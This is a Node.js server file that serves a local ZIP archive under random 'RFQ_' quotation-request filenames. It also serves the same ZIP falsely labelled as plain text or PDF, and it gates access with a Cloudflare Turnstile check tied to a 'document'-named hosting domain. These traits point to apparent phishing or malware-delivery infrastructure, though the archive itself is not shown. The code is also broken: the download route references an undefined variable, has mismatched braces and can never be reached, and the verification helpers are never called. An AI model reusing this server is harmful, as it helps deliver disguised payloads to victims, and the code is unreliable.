const http = require("node:http");
const fs = require("node:fs");
const path = require("node:path");

const PORT = process.env.PORT || 10000;
const HOST = "0.0.0.0";

const ZIP_PATH = path.join(__dirname, "build.zip");
const HTML_PATH = path.join(__dirname, "index.html");

// Cloudflare Turnstile server-side verification
async function verifyTurnstile(token) {
  const secret = process.env.TURNSTILE_SECRET_KEY;

  if (!secret || !token || typeof token !== "string") {
    return false;
  }

  if (token.length > 2048) {
    return false;
  }

  try {
    const response = await fetch(
      "https://challenges.cloudflare.com/turnstile/v0/siteverify",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          secret: secret,
          response: token
        }),
        signal: AbortSignal.timeout(10000)
      }
    );

    if (!response.ok) {
      return false;
    }

    const result = await response.json();

    return (
      result.success === true &&
      result.hostname ===
        "document4m27qx7f3n8p2l64.onrender.com"
    );

  } catch (error) {
    console.error("Turnstile verification error:", error);
    return false;
  }
}


async function readFormBody(req) {
  const chunks = [];
  let size = 0;

  for await (const chunk of req) {
    size += chunk.length;

    if (size > 8192) {
      throw new Error("Request too large");
    }

    chunks.push(chunk);
  }

  const body = Buffer.concat(chunks).toString("utf8");

  return new URLSearchParams(body);
}


const server = http.createServer((req, res) => {
  let url;

  try {
    url = new URL(
      req.url,
      `http://${req.headers.host || "localhost"}`
    );
  } catch {
    res.writeHead(400, {
      "Content-Type": "text/plain; charset=utf-8"
    });
    res.end("Bad request");
    return;
  }

  // Allow only GET and HEAD requests
  if (req.method !== "GET" && req.method !== "HEAD") {
    res.writeHead(405, {
      "Content-Type": "text/plain; charset=utf-8",
      Allow: "GET, HEAD"
    });
    res.end("Method not allowed");
    return;
  }

  // Download ZIP file with a random seven-digit filename
  if (url.pathname === "/download") {
   const isDownloadPost =
      url.pathname === "/download" &&
      req.method === "POST";
    
    if (
      req.method !== "GET" &&
      req.method !== "HEAD" &&
      !isDownloadPost
    ) {

      // Generate a random seven-digit number
      const randomNumber = Math.floor(
        1000000 + Math.random() * 9000000
      );

      const filename =
        `RFQ_${randomNumber}.zip`;

      res.writeHead(200, {
        "Content-Type": "application/zip",
        "Content-Disposition":
          `attachment; filename="${filename}"`,
        "Content-Length": stats.size,
        "X-Content-Type-Options": "nosniff",
        "Cache-Control": "no-store"
      });

      if (req.method === "HEAD") {
        res.end();
        return;
      }

      const stream = fs.createReadStream(ZIP_PATH);

      stream.on("error", (streamError) => {
        console.error("ZIP stream error:", streamError);
        res.destroy();
      });

      stream.pipe(res);
    });

    return;
  }

  // Serve the same ZIP file with different declared content types
  if (
    url.pathname === "/plain" ||
    url.pathname === "/pdf-label"
  ) {
    fs.readFile(ZIP_PATH, (err, data) => {
      if (err) {
        res.writeHead(500, {
          "Content-Type": "text/plain; charset=utf-8"
        });
        res.end("Unable to read ZIP file");
        return;
      }

      const declaredType =
        url.pathname === "/plain"
          ? "text/plain; charset=utf-8"
          : "application/pdf";

      res.writeHead(200, {
        "Content-Type": declaredType,
        "Content-Length": data.length,
        "X-Content-Type-Options": "nosniff",
        "Cache-Control": "no-store"
      });

      if (req.method === "HEAD") {
        res.end();
        return;
      }

      res.end(data);
    });

    return;
  }

  // Serve the HTML webpage
  if (url.pathname === "/" || url.pathname === "/index.html") {
    fs.stat(HTML_PATH, (err, stats) => {
      if (err || !stats.isFile()) {
        res.writeHead(500, {
          "Content-Type": "text/plain; charset=utf-8"
        });
        res.end("Unable to load page");
        return;
      }

      res.writeHead(200, {
        "Content-Type": "text/html; charset=utf-8",
        "Content-Length": stats.size,
        "X-Content-Type-Options": "nosniff",
        "Cache-Control": "no-cache"
      });

      if (req.method === "HEAD") {
        res.end();
        return;
      }

      const stream = fs.createReadStream(HTML_PATH);

      stream.on("error", (streamError) => {
        console.error("HTML stream error:", streamError);
        res.destroy();
      });

      stream.pipe(res);
    });

    return;
  }

  // Return 404 for unknown routes
  res.writeHead(404, {
    "Content-Type": "text/plain; charset=utf-8"
  });
  res.end("Not found");
});

// Start server on the hosting platform's assigned port
server.listen(PORT, HOST, () => {
  console.log(`Server listening on ${HOST}:${PORT}`);
});

// Handle server startup errors
server.on("error", (err) => {
  console.error("Server error:", err);
  process.exitCode = 1;
});
